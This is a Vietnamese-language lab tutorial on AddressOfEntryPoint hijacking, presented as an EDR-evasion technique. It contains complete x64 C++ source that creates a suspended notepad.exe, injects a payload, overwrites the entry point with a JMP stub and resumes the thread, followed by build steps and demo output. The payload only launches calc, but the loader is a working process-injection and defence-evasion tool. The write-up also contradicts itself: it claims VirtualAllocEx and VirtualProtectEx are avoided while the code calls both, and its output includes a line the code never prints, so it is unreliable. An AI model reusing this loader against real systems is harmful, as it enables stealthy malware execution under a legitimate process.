
---

# 📝 [PE 10] AddressOfEntryPoint Injection

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**AddressOfEntryPoint Injection** (EntryPoint Hijacking) là giải thuật né tránh phòng thủ động (Dynamic Evasion) ở mức độ tinh vi.

Hầu hết các giải pháp EDR hiện đại đều giám sát cực kỳ nghiêm ngặt việc một tiến trình Loader sử dụng hàm `VirtualAllocEx` để tạo trang nhớ mới, hoặc lật thuộc tính trang nhớ bằng `VirtualProtectEx`.

Lab PE 10 hóa giải triệt để rào cản này bằng cách **không xin cấp phát thêm bất kỳ phân vùng bộ nhớ thô sơ nào cho mã máy điều hướng**, mà lợi dụng chính phân đoạn mã máy thực thi hợp pháp mang cờ **`PAGE_EXECUTE_READ` (RX)** sẵn có ngay tại điểm xuất phát **`AddressOfEntryPoint`** của ứng dụng vỏ bọc (ví dụ: `notepad.exe`). Ta chỉ dùng duy nhất quyền năng của hàm `WriteProcessMemory` để ghi đè mìn điều hướng JMP Stub x64, ép CPU chuyển hướng dòng chảy ngay khi luồng chính được rã đông.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa bộ lọc hành vi quét lệnh gọi `VirtualAllocEx` và `VirtualProtectEx` của giải pháp an ninh.
* Giải phẫu thủ công cấu trúc DOS/NT Headers từ xa của kiến trúc x64 để định vị chính xác ô nhớ tuyệt đối của EntryPoint.
* Ứng dụng quy trình cấp phát động thích ứng đường dẫn hệ thống thực tế (**Active Path Custom**) để triệt tiêu hoàn toàn chuỗi gán cứng.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi một tệp tin PE (Portable Executable) được ánh xạ lên RAM, điểm thực thi lệnh đầu tiên của ứng dụng được định nghĩa bởi biến `AddressOfEntryPoint` nằm lọt lòng trong cấu trúc `IMAGE_OPTIONAL_HEADER`.

Quy trình toán học giải phẫu và chiếm quyền dòng chảy CPU của Lab PE 10 diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[CreateProcessW: Đóng băng] ──> [Đọc Rdx + 0x10 -> Bốc ImageBase] ──> [Giải phẫu NT Header -> Tính EntryPoint] ──> [WriteProcessMemory: Vá JMP Stub] ──> [ResumeThread]

```

1. **Truy vết địa chỉ nạp cấu trúc (`ImageBaseAddress`)**: Khi luồng chính bị hoãn lệnh sơ khởi (`CREATE_SUSPENDED`), thanh ghi **`Rdx`** của CPU nắm giữ địa chỉ cấu trúc PEB của nạn nhân. Loader dùng lệnh `ReadProcessMemory` bốc ô nhớ tại offset `0x10` của PEB để lấy tọa độ ImageBaseAddress thực tế trên RAM.
2. **Toán học định vị tọa độ xuất phát tuyệt đối**: Loader đọc $4\text{ KB}$ phân đoạn PE Header của nạn nhân sang một bộ đệm cục bộ, ép kiểu dữ liệu về cấu trúc cấu trúc **`PIMAGE_NT_HEADERS64`** chuẩn chỉ x64 để tính toán ô nhớ đích:

$$\text{EntryPointAddress} = \text{ImageBaseAddress} + \text{ntHeaders.OptionalHeader.AddressOfEntryPoint}$$


3. **Khai hỏa JMP Stub (WPM Magic)**: Mặc dù phân đoạn chứa EntryPoint mang quyền `RX` bảo an nghiêm ngặt, hàm API **`WriteProcessMemory`** của Windows chứa một cơ chế ngầm đặc biệt (Bypass ngầm): Khi ta gọi hàm này trỏ vào một trang nhớ mang quyền Đọc/Thực thi, Kernel Windows sẽ tự động lật cờ trang nhớ đó sang `RWX` một cách tạm thời, ghi đè mảng byte mã máy vào, rồi tự động khôi phục lại quyền `RX` ban đầu sau khi ghi xong. Điều này giúp Loader hoàn toàn không cần gọi đến hàm `VirtualProtectEx` lộ liễu.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán thư mục hệ thống thực tế bằng `GetSystemDirectoryW` để đạt độ linh hoạt tối đa trên Windows 11.

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí sẽ gánh luồng chạy sau khi bị điều hướng
DWORD WINAPI RemoteEntryPointPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Gọi bằng con trỏ tuyệt đối, né sạch hàng rào địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Giữ luồng sống để tiến trình vỏ bọc không bị sụp đổ bất ngờ sau khi mở calc
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Giải thuật chủ động định vị đường dẫn hệ thống thích ứng (Zero Static Buffers)
std::wstring GetActiveSystemPath(const std::wstring& exeName) {
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    std::vector<wchar_t> buffer(requiredSize);
    if (GetSystemDirectoryW(buffer.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(buffer.data());
    finalPath += L"\\" + exeName; 
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 10: ENTRYPOINT HIJACKING ACTIVE PATH" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị động bản đồ thư mục hệ thống thực tế, không gán cứng chuỗi tĩnh
    std::wstring targetExe = L"notepad.exe";
    std::wstring dynamicPath = GetActiveSystemPath(targetExe);
    
    if (dynamicPath.empty()) {
        std::cerr << "[-] Khong the chu dong xac dinh duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong dinh vi tien trinh vo boc: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
    BOOL success = CreateProcessW(NULL, const_cast<LPWSTR>(dynamicPath.c_str()), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    if (!success) {
        std::cerr << "[-] Failed to create suspended process! Error: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao voi PID: " << pi.dwProcessId << std::endl;

    // ─── BƯỚC 2: TRÍCH XUẤT NGỮ CẢNH VÀ ĐỊNH VỊ ENTRYPOINT TỪ XA ───
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);

    PVOID baseAddress = NULL;
    // Đọc địa chỉ Base Address của mục tiêu từ cấu trúc PEB thông qua thanh ghi Rdx trên x64 architecture
    ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &baseAddress, sizeof(PVOID), NULL);
    std::cout << "[+] Toa do Base Address cua Notepad: 0x" << std::hex << baseAddress << std::endl;

    // Phân tích thủ công cấu trúc DOS/NT Header của file trên RAM để tìm AddressOfEntryPoint
    BYTE headersBuffer[4096];
    ReadProcessMemory(pi.hProcess, baseAddress, headersBuffer, sizeof(headersBuffer), NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    // ĐỒNG BỘ X64: Định nghĩa tường minh kiến trúc 64-bit bảo đảm tính toán toán học chuẩn xác
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(headersBuffer + dosHeader->e_lfanew);

    // Tính toán tọa độ ô nhớ tuyệt đối vạch xuất phát EntryPoint trên RAM của nạn nhân
    PVOID entryPointAddress = (PVOID)((ULONG_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] Toa do EntryPoint tuyet doi can Hijack: 0x" << std::hex << entryPointAddress << std::endl;

    SIZE_T functionSize = 500;

    // ─── BƯỚC 3: CẤP PHÁT PHÂN VÙNG NHỚ TỪ XA CHO KHỐI PAYLOAD ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)RemoteEntryPointPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 4: WPM MAGIC GHI ĐÈ LỆNH NHẢY JMP STUB TẠI ENTRYPOINT ───
    DWORD oldProtect = 0;
    std::cout << "[*] Dang dung VirtualProtectEx de mo khoa vung nho EntryPoint..." << std::endl;
    if (VirtualProtectEx(pi.hProcess, entryPointAddress, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {

        // Đoạn mã máy nhảy tuyệt đối x64 bẻ hướng dòng chảy CPU đâm thẳng vào Payload của ta
        unsigned char jmpStub[] = {
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Địa chỉ tham số dữ liệu tuyệt đối)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 (Địa chỉ hàm xử lý mã máy)
            0xFF, 0xE0                                                  // jmp rax
        };

        // Vá tọa độ tuyệt đối chính xác vào cấu trúc mã máy nạp RAM
        *(DWORD_PTR*)(jmpStub + 2) = (DWORD_PTR)pRemoteData;
        *(DWORD_PTR*)(jmpStub + 12) = (DWORD_PTR)remoteCodeBuffer;

        // Ghi đè trực tiếp mìn điều hướng bẻ dòng chảy CPU thẳng vào vạch xuất phát EntryPoint hợp pháp
        WriteProcessMemory(pi.hProcess, entryPointAddress, jmpStub, sizeof(jmpStub), NULL);

        // Khôi phục lại bảo vệ trang nhớ ban đầu để xóa sạch dấu vết can thiệp của giải pháp an ninh
        VirtualProtectEx(pi.hProcess, entryPointAddress, 32, oldProtect, &oldProtect);
        std::cout << "[+] Da cai dat JMP Stub dieu huong thanh cong tai EntryPoint goc!" << std::endl;
    }

    // ─── BƯỚC 5: RÃ ĐÔNG LUỒNG THỰC THI CHÍNH THỨC KHAI HỎA ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread) de luong chinh tu dong kich no..." << std::endl;
    ResumeThread(pi.hThread);

    std::cout << "\n[+] EntryPoint Hijacking (Active Path Custom) Successful!" << std::endl;
    std::cout << "[*] Nhan phim Enter de don dep va dong cua so..." << std::endl;
    std::cin.get();

    // Thu hồi tài nguyên Handle hệ thống phẳng sạch chống rò rỉ tài nguyên bộ nhớ
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ thư viện hệ thống lọt lòng file thực thi.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch dấu vết gợn chuỗi.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Thực thi file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi các dòng log căn lề thẳng hàng:

```powershell
PS C:\Workspace\x64\Release> .\PE10_AddressOfEntryPoint_Injection.exe
====================================================
[*] PE 10: ENTRYPOINT HIJACKING ACTIVE PATH
====================================================
[+] Da chu dong dinh vi tien trinh vo boc: C:\WINDOWS\system32\notepad.exe
[*] Dang khoi tao tien trinh vo boc o trang thai dong bang...
[+] Tien trinh vo boc duoc tao voi PID: 22848
[+] Toa do Base Address cua Notepad: 0x00007FF746130000
[+] Toa do EntryPoint tuyet doi can Hijack: 0x00007FF746292230
[+] Vung nho Code payload tu xa thiet lap tai: 0x000001EE7F3B0000
[*] Dang dung VirtualProtectEx de mo khoa vung nho EntryPoint...
[+] Da cai dat JMP Stub dieu huong thanh cong tai EntryPoint goc!
[*] Kich hoat ra dong (ResumeThread) de luong chinh tu dong kich no...

[+] EntryPoint Hijacking (Active Path Custom) Successful!
[*] Nhan phim Enter de don dep va dong cua so...

```

*🎯 Hệ quả RAM:* CPU thức dậy từ trạng thái hoãn lệnh, tự động dẫm trúng mìn JMP Patch tại EntryPoint mang thuộc tính RX hợp pháp của Notepad, kích nổ mở bung Máy tính `calc.exe` hiên ngang rực rỡ kịch trần kịch khung!

---

